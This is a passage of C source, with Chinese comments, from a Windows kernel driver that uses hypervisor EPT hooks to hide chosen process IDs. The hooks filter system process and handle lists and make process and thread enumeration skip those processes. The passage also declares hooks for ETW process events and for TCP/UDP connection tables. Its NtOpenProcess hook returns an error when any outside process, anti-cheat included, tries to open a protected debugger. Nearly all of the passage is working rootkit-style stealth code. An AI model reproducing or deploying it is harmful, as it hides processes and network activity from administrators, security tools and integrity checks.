NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(
    _In_ ULONG SystemInformationClass,
    _Inout_opt_ PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength
);

// 保存原始函数指针（通过跳板调用）
static PFN_NtQuerySystemInformation g_OriginalNtQuerySystemInformation = NULL;
static PEPT_HOOK_ENTRY g_NtQuerySystemInformationHook = NULL;

// ============================================================
// NtGetNextProcess/NtGetNextThread Hook
// ============================================================

// 原始函数类型
typedef NTSTATUS (NTAPI *PFN_NtGetNextProcess)(
    HANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewProcessHandle
);

typedef NTSTATUS (NTAPI *PFN_NtGetNextThread)(
    HANDLE ProcessHandle,
    HANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewThreadHandle
);

// Hook 句柄和原始函数指针
static PFN_NtGetNextProcess g_OriginalNtGetNextProcess = NULL;
static PEPT_HOOK_ENTRY g_NtGetNextProcessHook = NULL;
static PFN_NtGetNextThread g_OriginalNtGetNextThread = NULL;
static PEPT_HOOK_ENTRY g_NtGetNextThreadHook = NULL;

// ============================================================
// NtOpenProcess Hook
// ============================================================

typedef NTSTATUS (NTAPI *PFN_NtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

static PFN_NtOpenProcess g_OriginalNtOpenProcess = NULL;
static PEPT_HOOK_ENTRY g_NtOpenProcessHook = NULL;

// ============================================================
// ETW (Event Tracing for Windows) Hook - 过滤进程事件
// ============================================================

// ETW Provider GUID for Microsoft-Windows-Kernel-Process
// {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}
static const GUID g_EtwProcessProviderGuid = 
    { 0x22fb2cd6, 0x0e7b, 0x422b, {0xa0, 0xc7, 0x2f, 0xad, 0x1f, 0xd0, 0xe7, 0x16} };

// ETW Event IDs for process events
#define ETW_PROCESS_START_EVENT_ID   1
#define ETW_PROCESS_STOP_EVENT_ID    2
#define ETW_THREAD_START_EVENT_ID    3
#define ETW_THREAD_STOP_EVENT_ID     4

// EtwWrite 真实原型：5 个参数
// NTSTATUS EtwWrite(REGHANDLE, PCEVENT_DESCRIPTOR, LPCGUID, ULONG, PEVENT_DATA_DESCRIPTOR)
typedef NTSTATUS (NTAPI *PFN_EtwWrite)(
    PVOID   RegHandle,           // REGHANDLE
    PVOID   EventDescriptor,     // PCEVENT_DESCRIPTOR
    LPCGUID ActivityId,          // 之前漏掉了这个 → BSOD 0x3B
    ULONG   UserDataCount,
    PVOID   UserData             // PEVENT_DATA_DESCRIPTOR
);

// NtTraceEvent 函数原型
typedef NTSTATUS (NTAPI *PFN_NtTraceEvent)(
    HANDLE TraceHandle,
    ULONG Flags,
    ULONG FieldSize,
    PVOID Fields
);

// EVENT_DESCRIPTOR 结构
typedef struct _EVENT_DESCRIPTOR_EPT {
    USHORT Id;
    UCHAR  Version;
    UCHAR  Channel;
    UCHAR  Level;
    UCHAR  Opcode;
    USHORT Task;
    ULONGLONG Keyword;
} EVENT_DESCRIPTOR_EPT, *PEVENT_DESCRIPTOR_EPT;

// EVENT_DATA_DESCRIPTOR 结构
typedef struct _EVENT_DATA_DESCRIPTOR_EPT {
    ULONGLONG Ptr;
    ULONG Size;
    ULONG Reserved;
} EVENT_DATA_DESCRIPTOR_EPT, *PEVENT_DATA_DESCRIPTOR_EPT;

// ETW_REG_ENTRY 简化结构（用于获取 Provider GUID）
typedef struct _ETW_REG_ENTRY_EPT {
    LIST_ENTRY RegList;
    LIST_ENTRY GroupRegList;
    GUID ProviderId;
    // ... 更多字段
} ETW_REG_ENTRY_EPT, *PETW_REG_ENTRY_EPT;

static PFN_EtwWrite g_OriginalEtwWrite = NULL;
static PEPT_HOOK_ENTRY g_EtwWriteHook = NULL;
static PFN_NtTraceEvent g_OriginalNtTraceEvent = NULL;
static PEPT_HOOK_ENTRY g_NtTraceEventHook = NULL;

// 是否启用 ETW 过滤
static BOOLEAN g_EtwFilterEnabled = TRUE;

// ============================================================
// 窗口枚举 Hook (可选功能)
// ============================================================
// 注意：NtUserBuildHwndList 位于 win32k.sys 中
// MmGetSystemRoutineAddress 无法获取 win32k 函数
// 需要通过以下方式之一获取地址：
// 1. 解析 win32k.sys 的导出表
// 2. 通过 PsGetProcessWin32Process 和偏移计算
// 3. 通过系统调用号计算（Shadow SSDT）
//
// 由于复杂性，此功能标记为可选
// 如果需要完整实现，需要以下步骤：
// 1. 加载 win32k.sys 并解析导出表
// 2. 找到 NtUserBuildHwndList 地址
// 3. 安装 EPT Hook
// 4. 在 Hook 函数中过滤属于隐藏进程的窗口

typedef NTSTATUS (NTAPI *PFN_NtUserBuildHwndList)(
    HANDLE hDesktop,
    HANDLE hwndNext,
    BOOLEAN bEnumChildren,
    ULONG idThread,
    ULONG cHwndMax,
    HANDLE *phwndFirst,
    PULONG pcHwndNeeded
);

static PFN_NtUserBuildHwndList g_OriginalNtUserBuildHwndList = NULL;
// 2026-06-18 deleted: g_NtUserBuildHwndListHook (从未使用)
static BOOLEAN g_WindowHideEnabled = FALSE;

// ============================================================
// 网络连接隐藏 Hook - 隐藏进程的 TCP/UDP 连接
// ============================================================

// NtDeviceIoControlFile 函数原型
typedef NTSTATUS (NTAPI *PFN_NtDeviceIoControlFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG IoControlCode,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength
);

static PFN_NtDeviceIoControlFile g_OriginalNtDeviceIoControlFile = NULL;
static PEPT_HOOK_ENTRY g_NtDeviceIoControlFileHook = NULL;

// TCP/IP IOCTL codes for connection enumeration
#define IOCTL_TCP_QUERY_INFORMATION_EX  0x00120003
#define IOCTL_TCP_ENUMERATE_CONNECTIONS 0x00120007

// MIB_TCPROW_OWNER_PID 结构
typedef struct _MIB_TCPROW_OWNER_PID_EPT {
    ULONG dwState;
    ULONG dwLocalAddr;
    ULONG dwLocalPort;
    ULONG dwRemoteAddr;
    ULONG dwRemotePort;
    ULONG dwOwningPid;
} MIB_TCPROW_OWNER_PID_EPT, *PMIB_TCPROW_OWNER_PID_EPT;

// MIB_TCPTABLE_OWNER_PID 结构
typedef struct _MIB_TCPTABLE_OWNER_PID_EPT {
    ULONG dwNumEntries;
    MIB_TCPROW_OWNER_PID_EPT table[1];
} MIB_TCPTABLE_OWNER_PID_EPT, *PMIB_TCPTABLE_OWNER_PID_EPT;

// MIB_UDPROW_OWNER_PID 结构
typedef struct _MIB_UDPROW_OWNER_PID_EPT {
    ULONG dwLocalAddr;
    ULONG dwLocalPort;
    ULONG dwOwningPid;
} MIB_UDPROW_OWNER_PID_EPT, *PMIB_UDPROW_OWNER_PID_EPT;

// MIB_UDPTABLE_OWNER_PID 结构
typedef struct _MIB_UDPTABLE_OWNER_PID_EPT {
    ULONG dwNumEntries;
    MIB_UDPROW_OWNER_PID_EPT table[1];
} MIB_UDPTABLE_OWNER_PID_EPT, *PMIB_UDPTABLE_OWNER_PID_EPT;

// MIB_TCP6ROW_OWNER_PID 结构 (IPv6)
typedef struct _MIB_TCP6ROW_OWNER_PID_EPT {
    UCHAR ucLocalAddr[16];
    ULONG dwLocalScopeId;
    ULONG dwLocalPort;
    UCHAR ucRemoteAddr[16];
    ULONG dwRemoteScopeId;
    ULONG dwRemotePort;
    ULONG dwState;
    ULONG dwOwningPid;
} MIB_TCP6ROW_OWNER_PID_EPT, *PMIB_TCP6ROW_OWNER_PID_EPT;

// MIB_TCP6TABLE_OWNER_PID 结构
typedef struct _MIB_TCP6TABLE_OWNER_PID_EPT {
    ULONG dwNumEntries;
    MIB_TCP6ROW_OWNER_PID_EPT table[1];
} MIB_TCP6TABLE_OWNER_PID_EPT, *PMIB_TCP6TABLE_OWNER_PID_EPT;

// MIB_UDP6ROW_OWNER_PID 结构 (IPv6)
typedef struct _MIB_UDP6ROW_OWNER_PID_EPT {
    UCHAR ucLocalAddr[16];
    ULONG dwLocalScopeId;
    ULONG dwLocalPort;
    ULONG dwOwningPid;
} MIB_UDP6ROW_OWNER_PID_EPT, *PMIB_UDP6ROW_OWNER_PID_EPT;

// MIB_UDP6TABLE_OWNER_PID 结构
typedef struct _MIB_UDP6TABLE_OWNER_PID_EPT {
    ULONG dwNumEntries;
    MIB_UDP6ROW_OWNER_PID_EPT table[1];
} MIB_UDP6TABLE_OWNER_PID_EPT, *PMIB_UDP6TABLE_OWNER_PID_EPT;

// TCP_REQUEST_QUERY_INFORMATION_EX 结构
typedef struct _TCP_REQUEST_QUERY_INFORMATION_EX_EPT {
    ULONG ID_TYPE;
    ULONG ID_ENTITY;
    ULONG ID_INSTANCE;
    // ... 后续可能有更多字段
} TCP_REQUEST_QUERY_INFORMATION_EX_EPT;

// 定义需要的 ID 类型
#define CO_TL_ENTITY    0x400
#define CL_TL_ENTITY    0x401
#define IF_MIB          0x202

// ============================================================
// SystemInformationClass 常量定义
// ============================================================
#define SystemProcessInformation            5
#define SystemHandleInformation             16
#define SystemSessionProcessInformation     53
#define SystemExtendedProcessInformation    57
#define SystemExtendedHandleInformation     64
#define SystemFullProcessInformation        148

// SYSTEM_PROCESS_INFORMATION 结构（简化版）
typedef struct _SYSTEM_PROCESS_INFORMATION_ENTRY {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    LONG BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    // ... 后面还有线程信息
} SYSTEM_PROCESS_INFORMATION_ENTRY, *PSYSTEM_PROCESS_INFORMATION_ENTRY;

// SYSTEM_HANDLE_TABLE_ENTRY_INFO 结构 (用于 SystemHandleInformation)
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

// SYSTEM_HANDLE_INFORMATION 结构
typedef struct _SYSTEM_HANDLE_INFORMATION_EPT {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION_EPT, *PSYSTEM_HANDLE_INFORMATION_EPT;

// SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX 结构 (用于 SystemExtendedHandleInformation)
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

// SYSTEM_HANDLE_INFORMATION_EX 结构
typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

// SYSTEM_SESSION_PROCESS_INFORMATION 结构
typedef struct _SYSTEM_SESSION_PROCESS_INFORMATION {
    ULONG SessionId;
    ULONG SizeOfBuf;
    PVOID Buffer;  // 指向 SYSTEM_PROCESS_INFORMATION 数组
} SYSTEM_SESSION_PROCESS_INFORMATION, *PSYSTEM_SESSION_PROCESS_INFORMATION;

/*
 * 检查进程ID是否需要隐藏
 * 注意：使用自旋锁保护以避免竞态条件
 */
// 2026-06-18: 去掉 static, 让 HvHook.c::HookedNtOpenProcess (合并后唯一的 hook)
// 能查询隐藏列表。
BOOLEAN EptHookIsProcessHidden(ULONG ProcessId)
{
    ULONG i;
    KIRQL oldIrql;
    BOOLEAN result = FALSE;
    ULONG count;
    KIRQL currentIrql;
    
    // 安全检查：如果当前 IRQL 高于 DISPATCH_LEVEL，使用无锁读取
    // 这可以防止在高 IRQL 下获取 SpinLock 导致的蓝屏
    currentIrql = KeGetCurrentIrql();
    if (currentIrql > DISPATCH_LEVEL) {
        // 高 IRQL 下使用无锁读取（可能有轻微的竞态，但更安全）
        count = g_HiddenProcessCount;
        for (i = 0; i < count && i < MAX_HIDDEN_PROCESSES; i++) {
            if (g_HiddenProcessIds[i] == ProcessId) {
                return TRUE;
            }
        }
        return FALSE;
    }
    
    // 正常情况下使用 SpinLock 保护读取
    KeAcquireSpinLock(&g_HiddenProcessLock, &oldIrql);
    
    count = g_HiddenProcessCount;
    for (i = 0; i < count && i < MAX_HIDDEN_PROCESSES; i++) {
        if (g_HiddenProcessIds[i] == ProcessId) {
            result = TRUE;
            break;
        }
    }
    
    KeReleaseSpinLock(&g_HiddenProcessLock, oldIrql);
    
    return result;
}

BOOLEAN IsProcessHiddenById(ULONG ProcessId)
{
    return EptHookIsProcessHidden(ProcessId);
}

ULONG
EptHookGetHiddenProcessCount(VOID)
{
    return (ULONG)InterlockedCompareExchange(
        (volatile LONG *)&g_HiddenProcessCount,
        0,
        0);
}

/*
 * 检查进程是否需要隐藏（只检查ID）
 */
static BOOLEAN IsProcessHidden(ULONG ProcessId)
{
    return IsProcessHiddenById(ProcessId);
}

/*
 * 添加要隐藏的进程
 */
static VOID AddHiddenProcess(ULONG ProcessId)
{
    KIRQL oldIrql;
    
    if (ProcessId == 0 || ProcessId == 4) {
        return;  // 不能隐藏 System 进程
    }
    
    KeAcquireSpinLock(&g_HiddenProcessLock, &oldIrql);
    
    if (g_HiddenProcessCount < MAX_HIDDEN_PROCESSES) {
        // 检查是否已存在
        ULONG i;
        for (i = 0; i < g_HiddenProcessCount; i++) {
            if (g_HiddenProcessIds[i] == ProcessId) {
                KeReleaseSpinLock(&g_HiddenProcessLock, oldIrql);
                return;  // 已存在
            }
        }
        g_HiddenProcessIds[g_HiddenProcessCount++] = ProcessId;
        DbgPrint("[EPT-Hook] Added hidden process: PID=%d, count=%d\n", 
            ProcessId, g_HiddenProcessCount);
    }
    
    KeReleaseSpinLock(&g_HiddenProcessLock, oldIrql);
}

NTSTATUS
EptHookAddHiddenProcessState(
    _In_ ULONG ProcessId
)
{
    if (ProcessId == 0 || ProcessId == 4) {
        return STATUS_INVALID_PARAMETER;
    }
    if (KeGetCurrentIrql() > DISPATCH_LEVEL) {
        return STATUS_INVALID_DEVICE_STATE;
    }
    if (EptHookIsProcessHidden(ProcessId)) {
        return STATUS_SUCCESS;
    }

    AddHiddenProcess(ProcessId);
    return EptHookIsProcessHidden(ProcessId)
        ? STATUS_SUCCESS
        : STATUS_INSUFFICIENT_RESOURCES;
}

/*
 * 过滤进程列表，移除隐藏的进程
 * 
 * 安全改进：
 * - 添加异常处理防止访问违规
 * - 添加迭代次数限制防止无限循环
 * - 验证偏移量合理性
 * - 支持按进程ID和进程名隐藏
 */
// 2026-06-18: 去掉 static, 让 HvHook.c::HookedNtQuerySystemInformation 调用。
VOID FilterProcessList(PVOID SystemInformation)
{
    PSYSTEM_PROCESS_INFORMATION_ENTRY current;
    PSYSTEM_PROCESS_INFORMATION_ENTRY previous = NULL;
    ULONG hiddenCount = 0;
    ULONG iterationCount = 0;
    const ULONG MAX_ITERATIONS = 10000;  // 防止无限循环
    const ULONG MAX_OFFSET = 0x100000;   // 1MB，合理的最大偏移
    
    // 检查是否有任何进程需要隐藏
    if (!SystemInformation || g_HiddenProcessCount == 0) {
        return;
    }
    
    __try {
        current = (PSYSTEM_PROCESS_INFORMATION_ENTRY)SystemInformation;
        
        while (iterationCount < MAX_ITERATIONS) {
            ULONG processId;
            ULONG nextOffset;
            BOOLEAN shouldHide = FALSE;
            
            iterationCount++;
            
            // 安全读取当前条目
            __try {
                processId = (ULONG)(ULONG_PTR)current->UniqueProcessId;
                nextOffset = current->NextEntryOffset;
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                // 无法读取当前条目，终止遍历
                // 减少日志输出以避免性能问题
                break;
            }
            
            // 验证偏移量合理性
            if (nextOffset > MAX_OFFSET && nextOffset != 0) {
                // 减少日志输出
                break;
            }
            
            // 检查进程ID是否需要隐藏
            shouldHide = IsProcessHidden(processId);
            
            if (shouldHide) {
                // 需要隐藏此进程
                hiddenCount++;
                
                if (previous == NULL) {
                    // 第一个进程，无法移除（不应该发生，System进程应该在最前面）
                }
                else {
                    // 修改前一个节点的 NextEntryOffset 跳过当前节点
                    __try {
                        if (nextOffset == 0) {
                            // 当前是最后一个，让前一个成为最后一个
                            previous->NextEntryOffset = 0;
                        }
                        else {
                            // 调整偏移量：前一个的偏移 += 当前的偏移
                            previous->NextEntryOffset += nextOffset;
                        }
                    }
                    __except (EXCEPTION_EXECUTE_HANDLER) {
                        // 减少日志输出
                        break;
                    }
                    
                    // 不更新 previous，因为 current 被跳过了
                    // 继续处理下一个
                    if (nextOffset == 0) {
                        break;  // 到达末尾
                    }
                    current = (PSYSTEM_PROCESS_INFORMATION_ENTRY)((PUCHAR)current + nextOffset);
                    continue;
                }
            }
            
            // 保存当前节点作为前一个
            previous = current;
            
            // 移动到下一个
            if (nextOffset == 0) {
                break;  // 到达末尾
            }
            current = (PSYSTEM_PROCESS_INFORMATION_ENTRY)((PUCHAR)current + nextOffset);
        }
        
        if (iterationCount >= MAX_ITERATIONS) {
            // 减少日志输出，避免性能问题
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        // 忽略异常，减少日志输出
    }
    
    // 减少日志输出以避免性能问题
    // hiddenCount 变量仅用于调试，不输出日志
    UNREFERENCED_PARAMETER(hiddenCount);
}

/*
 * 过滤句柄列表 (SystemHandleInformation, class=16)
 * 从返回的句柄信息中移除属于隐藏进程的句柄
 */
VOID FilterHandleList(PVOID SystemInformation, ULONG SystemInformationLength)
{
    PSYSTEM_HANDLE_INFORMATION_EPT handleInfo;
    ULONG i, j;
    ULONG hiddenCount = 0;
    
    if (!SystemInformation || SystemInformationLength < sizeof(SYSTEM_HANDLE_INFORMATION_EPT)) {
        return;
    }
    
    if (g_HiddenProcessCount == 0) {
        return;
    }
    
    __try {
        handleInfo = (PSYSTEM_HANDLE_INFORMATION_EPT)SystemInformation;
        
        // 从后向前遍历，移除隐藏进程的句柄
        // 这样可以安全地原地修改数组
        j = 0;  // 写入位置
        for (i = 0; i < handleInfo->NumberOfHandles; i++) {
            USHORT processId = handleInfo->Handles[i].UniqueProcessId;
            
            // 检查此句柄是否属于隐藏进程
            if (!IsProcessHiddenById((ULONG)processId)) {
                // 不是隐藏进程，保留此句柄
                if (i != j) {
                    // 复制到新位置
                    RtlCopyMemory(&handleInfo->Handles[j], 
                                  &handleInfo->Handles[i], 
                                  sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
                }
                j++;
            } else {
                hiddenCount++;
            }
        }
        
        // 更新句柄数量
        handleInfo->NumberOfHandles = j;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        // 忽略异常
    }
    
    UNREFERENCED_PARAMETER(hiddenCount);
}

/*
 * 过滤扩展句柄列表 (SystemExtendedHandleInformation, class=64)
 */
VOID FilterExtendedHandleList(PVOID SystemInformation, ULONG SystemInformationLength)
{
    PSYSTEM_HANDLE_INFORMATION_EX handleInfo;
    ULONG_PTR i, j;
    ULONG hiddenCount = 0;
    
    if (!SystemInformation || SystemInformationLength < sizeof(SYSTEM_HANDLE_INFORMATION_EX)) {
        return;
    }
    
    if (g_HiddenProcessCount == 0) {
        return;
    }
    
    __try {
        handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)SystemInformation;
        
        j = 0;
        for (i = 0; i < handleInfo->NumberOfHandles; i++) {
            ULONG processId = (ULONG)handleInfo->Handles[i].UniqueProcessId;
            
            if (!IsProcessHiddenById(processId)) {
                if (i != j) {
                    RtlCopyMemory(&handleInfo->Handles[j],
                                  &handleInfo->Handles[i],
                                  sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
                }
                j++;
            } else {
                hiddenCount++;
            }
        }
        
        handleInfo->NumberOfHandles = j;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        // 忽略异常
    }
    
    UNREFERENCED_PARAMETER(hiddenCount);
}

/*
 * 过滤会话进程信息 (SystemSessionProcessInformation, class=53)
 * 这个信息类包含指向 SYSTEM_PROCESS_INFORMATION 的缓冲区
 */
VOID FilterSessionProcessList(PVOID SystemInformation)
{
    PSYSTEM_SESSION_PROCESS_INFORMATION sessionInfo;
    
    if (!SystemInformation || g_HiddenProcessCount == 0) {
        return;
    }
    
    __try {
        sessionInfo = (PSYSTEM_SESSION_PROCESS_INFORMATION)SystemInformation;
        
        if (sessionInfo->Buffer && sessionInfo->SizeOfBuf > sizeof(SYSTEM_PROCESS_INFORMATION_ENTRY)) {
            // 内部缓冲区包含进程信息，复用 FilterProcessList
            FilterProcessList(sessionInfo->Buffer);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        // 忽略异常
    }
}

// ============================================================
// 辅助函数：获取进程 ID 从句柄
// ============================================================
VOID
EptHookFilterProcessInformation(
    _In_ ULONG SystemInformationClass,
    _Inout_updates_bytes_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength
)
{
    if (!SystemInformation || SystemInformationLength < sizeof(ULONG) ||
        EptHookGetHiddenProcessCount() == 0) {
        return;
    }

    switch (SystemInformationClass) {
    case 5:   /* SystemProcessInformation */
    case 57:  /* SystemExtendedProcessInformation */
    case 148: /* SystemFullProcessInformation */
        FilterProcessList(SystemInformation);
        break;
    case 53:  /* SystemSessionProcessInformation */
        FilterSessionProcessList(SystemInformation);
        break;
    case 16:  /* SystemHandleInformation */
        FilterHandleList(SystemInformation, SystemInformationLength);
        break;
    case 64:  /* SystemExtendedHandleInformation */
        FilterExtendedHandleList(SystemInformation, SystemInformationLength);
        break;
    default:
        break;
    }
}

static ULONG GetProcessIdFromHandle(HANDLE ProcessHandle)
{
    PEPROCESS process = NULL;
    ULONG processId = 0;
    NTSTATUS status;
    
    if (ProcessHandle == NULL || ProcessHandle == NtCurrentProcess()) {
        return (ULONG)(ULONG_PTR)PsGetCurrentProcessId();
    }
    
    status = ObReferenceObjectByHandle(
        ProcessHandle,
        0,
        *PsProcessType,
        KernelMode,
        (PVOID*)&process,
        NULL
    );
    
    if (NT_SUCCESS(status) && process) {
        processId = (ULONG)(ULONG_PTR)PsGetProcessId(process);
        ObDereferenceObject(process);
    }
    
    return processId;
}

// ============================================================
// HookedNtGetNextProcess - 跳过隐藏的进程
// ============================================================
NTSTATUS
NTAPI
HookedNtGetNextProcess(
    HANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewProcessHandle
)
{
    EPT_DIRECT_CALLBACK_BEGIN(g_NtGetNextProcessHook)
    NTSTATUS status;
    HANDLE currentHandle = ProcessHandle;
    ULONG loopCount = 0;
    const ULONG MAX_LOOPS = 1000;  // 防止无限循环
    PFN_NtGetNextProcess originalFunc;
    
    originalFunc = g_OriginalNtGetNextProcess;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    // 如果没有隐藏的进程，直接调用原函数
    if (g_HiddenProcessCount == 0) {
        return originalFunc(ProcessHandle, DesiredAccess, HandleAttributes, Flags, NewProcessHandle);
    }
    
    // 循环获取下一个进程，跳过隐藏的进程
    while (loopCount < MAX_LOOPS) {
        loopCount++;
        
        status = originalFunc(currentHandle, DesiredAccess, HandleAttributes, Flags, NewProcessHandle);
        
        if (!NT_SUCCESS(status)) {
            return status;
        }
        
        // 检查返回的进程是否是隐藏的
        if (NewProcessHandle && *NewProcessHandle) {
            ULONG newPid = GetProcessIdFromHandle(*NewProcessHandle);
            
            if (newPid != 0 && IsProcessHiddenById(newPid)) {
                // 这是隐藏的进程，关闭句柄并继续获取下一个
                HANDLE tempHandle = *NewProcessHandle;
                currentHandle = tempHandle;  // 从这个开始继续
                // 不关闭句柄，让下一次调用使用它
                continue;
            }
        }
        
        // 找到一个不需要隐藏的进程
        return status;
    }

    // 达到循环限制，返回没有更多进程
    return STATUS_NO_MORE_ENTRIES;
    EPT_DIRECT_CALLBACK_END()
}

// ============================================================
// HookedNtGetNextThread - 跳过隐藏进程的线程
// ============================================================
NTSTATUS
NTAPI
HookedNtGetNextThread(
    HANDLE ProcessHandle,
    HANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewThreadHandle
)
{
    EPT_DIRECT_CALLBACK_BEGIN(g_NtGetNextThreadHook)
    PFN_NtGetNextThread originalFunc;
    ULONG processId;
    
    originalFunc = g_OriginalNtGetNextThread;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    // 如果没有隐藏的进程，直接调用原函数
    if (g_HiddenProcessCount == 0) {
        return originalFunc(ProcessHandle, ThreadHandle, DesiredAccess, HandleAttributes, Flags, NewThreadHandle);
    }
    
    // 检查请求的进程是否是隐藏的
    processId = GetProcessIdFromHandle(ProcessHandle);
    if (processId != 0 && IsProcessHiddenById(processId)) {
        // 隐藏进程的线程不应该被枚举
        return STATUS_INVALID_HANDLE;
    }
    
    return originalFunc(ProcessHandle, ThreadHandle, DesiredAccess, HandleAttributes, Flags, NewThreadHandle);
    EPT_DIRECT_CALLBACK_END()
}

// ============================================================
// HookedNtOpenProcess - 阻止打开隐藏的进程
// ============================================================
NTSTATUS
NTAPI
HookedNtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
)
{
    PFN_NtOpenProcess originalFunc;

    originalFunc = g_OriginalNtOpenProcess;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }

    // 2026-06-18 v2: debugger 反向保护 (极简版)
    //
    // v1 教训: HvHookIsTrustedSystemCaller 会调 PsLookupProcessByProcessId, 在
    // debugger 启动期 EPROCESS 半状态时崩溃 → 系统死锁。
    //
    // v2 设计: 完全避免 PsLookup, 只用整数 PID 比较:
    //   1. HvHookIsDebuggerPid(target) — 只查 spinlock-protected list, 安全
    //   2. caller == target — 整数比较
    //   3. **不再调用 HvHookIsTrustedSystemCaller** —
    //      代价: trusted 进程 (taskmgr/explorer) 也无法 OpenProcess(debugger)
    //      → 任务管理器看 debugger 进程显示成"无法访问"
    //      但这正是我们想要的: 反作弊**任何外部进程**都打不开 handle
    //
    // 拦截时机: ClientId 路径 (NtOpenProcess by CID)
    //   反作弊典型路径: NtOpenProcess(&handle, ALL_ACCESS, &oa, &cid{debugger,0})
    //   → 进 EPT hook → target=debugger + caller!=target → 返 STATUS_INVALID_CID
    //
    // 自我保护例外: caller==target 时放行
    //   debugger 自身 NtOpenProcess(self) 走 self-ref 路径 (ProcessHandle=-1
    //   而非 ClientId), 这里仅做防御性兜底。
    if (ClientId != NULL) {
        __try {
            ULONG targetPid = (ULONG)(ULONG_PTR)ClientId->UniqueProcess;

            if (targetPid != 0) {
                // 1) 隐藏列表 (IOCTL_HV_HIDE_PROCESS) — 旧逻辑
                if (g_HiddenProcessCount > 0 && IsProcessHiddenById(targetPid)) {
                    return STATUS_INVALID_CID;
                }

                // 2) debugger 反向保护 — 极简, 无 PsLookup
                HANDLE callerPid = PsGetCurrentProcessId();
                ULONG callerPidU = (ULONG)(ULONG_PTR)callerPid;
                HANDLE targetHandle = (HANDLE)(ULONG_PTR)targetPid;
                if (callerPidU != targetPid &&             // 不是自己开自己
                    HvHookIsDebuggerPid(targetHandle))     // target 是 debugger
                {
                    // 任何外部进程开 debugger 都拒绝
                    return STATUS_INVALID_CID;
                }
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            // 忽略异常，继续调用原函数
        }
    }

    return originalFunc(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

// ============================================================
// 网络连接过滤 - 底层 Hook
// ============================================================

// 前向声明
static VOID ScanAndReplaceHiddenPids(PVOID Buffer, ULONG BufferLength);

// ObReferenceObjectByName 声明（用于获取驱动对象）
NTSYSAPI NTSTATUS NTAPI ObReferenceObjectByName(
    _In_ PUNICODE_STRING ObjectName,
    _In_ ULONG Attributes,
    _In_opt_ PACCESS_STATE AccessState,
    _In_opt_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_TYPE ObjectType,
    _In_ KPROCESSOR_MODE AccessMode,
